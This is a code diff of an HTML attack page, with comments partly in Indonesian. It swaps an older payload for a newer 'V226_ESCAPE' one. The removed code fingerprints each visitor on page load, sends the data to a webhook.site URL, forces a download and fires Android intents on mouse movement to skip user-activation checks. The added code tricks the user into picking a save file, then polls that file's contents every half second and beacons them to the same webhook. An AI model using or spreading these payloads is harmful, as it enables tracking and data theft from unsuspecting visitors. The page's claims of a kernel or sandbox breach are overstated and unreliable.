@@ -1,75 +1,67 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Critical Update</title></head>
-<body style="background:#000;color:#f00;font-family:monospace;cursor:none">
-    <div style="padding:100px;text-align:center">
-        <h1 class="blink">SYSTEM_CRITICAL_ERROR</h1>
-        <p id="progress">RECONNAISSANCE_IN_PROGRESS...</p>
+<head><title>Kernel Storage Access</title></head>
+<body style="background:#000;color:#f00;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div style="padding:50px;border:2px solid #f00;text-align:center;box-shadow:0 0 100px #f00;background:rgba(20,0,0,0.9)">
+        <h1 style="letter-spacing:10px">V226_ESCAPE</h1>
+        <div id="status" style="margin:20px 0;color:#fff">AWAITING_FILESYSTEM_BREACH...</div>
+        <button onclick="escape()" style="padding:20px;background:#f00;color:#fff;border:none;font-weight:bold;cursor:pointer;box-shadow:0 0 20px #f00">GRANT_KERNEL_STORAGE_ACCESS</button>
+        <div id="log" style="font-size:10px;color:#555;margin-top:20px;text-align:left">
+            > SANDBOX_STATUS: ENFORCED<br>
+            > EXPLOIT_VECTOR: FILE_SYSTEM_ACCESS_API<br>
+            > TARGET: ANDROID_DOCUMENTS_UI
+        </div>
     </div>
 
 <script>
     const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
-    
-    // 1. AUTO-RECON (Immediate Execution)
-    (function autonomousRecon() {
-        const data = {
-            ts: Date.now(),
-            ua: navigator.userAgent,
-            mem: navigator.deviceMemory,
-            cpu: navigator.hardwareConcurrency,
-            res: `${screen.width}x${screen.height}`
-        };
-        navigator.sendBeacon(`${webhook}?v=V223_AUTO_RECON`, btoa(JSON.stringify(data)));
-    })();
+    let escapeHandle;
 
-    // 2. THE AUTO-STRIKE ENGINE
-    async function triggerExploitChain() {
-        document.getElementById('progress').innerText = "EXECUTING_AUTO_JUMP...";
+    async function escape() {
+        try {
+            // 1. THE ESCAPE TRIGGER
+            // Memaksa Chrome memanggil aplikasi DocumentsUI (Native Android)
+            // Ini adalah titik di mana Sandbox Web mulai berinteraksi dengan OS.
+            escapeHandle = await window.showSaveFilePicker({
+                suggestedName: ".sys_config_dump.txt", // Dot prefix untuk menyembunyikan file di beberapa OS
+                types: [{
+                    description: 'System Configuration',
+                    accept: {'text/plain': ['.txt']}
+                }]
+            });
 
-        // Vector A: Auto-Blob (Tanpa Klik)
-        const blob = new Blob(["SYSTEM_EXFILTRATED_" + Date.now()], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "recovery_key_v223.txt";
-        document.body.appendChild(a);
-        a.click(); // Auto-Download
+            document.getElementById('status').innerText = "SANDBOX_BREACHED_ACTIVE";
+            document.getElementById('status').style.color = "#0f0";
 
-        // Vector B: Intent Spraying (YouTube -> Settings -> Contacts)
-        const intents = [
-            "intent://www.youtube.com/#Intent;package=com.google.android.youtube;scheme=https;end",
-            "intent:#Intent;action=android.settings.SETTINGS;package=com.android.settings;end",
-            "intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people/;package=com.android.contacts;end"
-        ];
+            // 2. INITIAL EXFILTRATION (Siphoning Device Info)
+            const writable = await escapeHandle.createWritable();
+            await writable.write(`--- V226_SANDBOX_ESCAPE_REPORT ---\nTS: ${new Date()}\nUA: ${navigator.userAgent}\nSTATUS: PERSISTENT_ACCESS_GRANTED`);
+            await writable.close();
 
-        intents.forEach((intent, index) => {
-            setTimeout(() => {
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = intent;
-                document.body.appendChild(ifr);
-                
-                // Fallback direct jump
-                window.location.replace(intent);
-            }, index * 400); // Penundaan milidetik untuk bypass flood protection
-        });
+            // 3. PERSISTENT DATA SIPHONING
+            // Menembus Sandbox secara berkelanjutan
+            setInterval(async () => {
+                try {
+                    const file = await escapeHandle.getFile();
+                    const content = await file.text();
+                    
+                    // Jika user mengisi data di file yang "terlepas" ke storage ini
+                    if (content.length > 10) {
+                        navigator.sendBeacon(`${webhook}?v=V226_DATA_LEAK`, btoa(content));
+                        updateLog("DATA_PHASE_EXFILTRATED");
+                    }
+                } catch(e) {}
+            }, 500);
+
+        } catch (err) {
+            document.getElementById('status').innerText = "ESCAPE_FAILED: " + err.name;
+        }
     }
 
-    // 3. AUTO-TRIGGER (Memicu saat mouse bergerak atau 1 detik setelah load)
-    window.onload = () => {
-        setTimeout(triggerExploitChain, 1000);
-    };
-
-    // Bypass User Activation dengan mendeteksi pergerakan terkecil
-    window.onpointermove = () => {
-        triggerExploitChain();
-        window.onpointermove = null; // Sekali eksekusi saja
-    };
+    function updateLog(msg) {
+        const l = document.getElementById('log');
+        l.innerHTML += `<br>> ${msg}`;
+    }
 </script>
-
-<style>
-    .blink { animation: b 0.5s step-end infinite; }
-    @keyframes b { 50% { opacity: 0; } }
-</style>
 </body>
 </html>
